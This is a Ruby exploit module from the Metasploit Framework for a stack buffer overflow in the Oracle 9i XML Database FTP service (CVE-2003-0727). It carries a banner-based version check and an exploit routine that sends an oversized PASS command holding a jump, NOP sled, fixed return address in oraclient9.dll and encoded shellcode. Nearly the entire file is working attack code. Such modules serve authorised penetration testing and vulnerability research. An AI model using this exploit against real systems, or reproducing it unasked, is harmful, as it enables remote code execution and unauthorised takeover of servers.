##
# $Id: oracle9i_xdb_ftp_pass.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle 9i XDB FTP PASS Overflow (win32)',
			'Description'    => %q{
					By passing an overly long string to the PASS command, a
				stack based buffer overflow occurs. David Litchfield, has
				illustrated multiple vulnerabilities in the Oracle 9i XML
				Database (XDB), during a seminar on "Variations in exploit
				methods between Linux and Windows" presented at the Blackhat
				conference.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2003-0727'],
					[ 'OSVDB', '2449'],
					[ 'BID', '8375'],
					[ 'URL', 'http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 800,
					'BadChars' => "\x00\x09\x0a\x0d\x20\x22\x25\x26\x27\x2b\x2f\x3a\x3c\x3e\x3f\x40",
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Targets'        =>
				[
					[
						'Oracle 9.2.0.1 Universal',
						{
									'Platform' => 'win',
									'Ret'      => 0x60616d46, # oraclient9.dll (pop/pop/ret)
						},
					],
				],
			'DisclosureDate' => 'Aug 18 2003',
			'DefaultTarget' => 0))

		register_options([Opt::RPORT(2100),], self.class)
		deregister_options('FTPUSER', 'FTPPASS')
	end


	def check
		connect
		disconnect
		if (banner =~ /9\.2\.0\.1\.0/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		user   = rand_text_alpha_upper(10)
		sploit =  rand_text_alpha_upper(442) + Rex::Arch::X86.jmp_short(6)
		sploit << make_nops(2) + [target.ret].pack('V') + payload.encoded

		print_status("Trying target #{target.name}...")

		send_cmd( ['USER', user], true )
		send_cmd( ['PASS', sploit], false )

		handler
		disconnect
	end

end
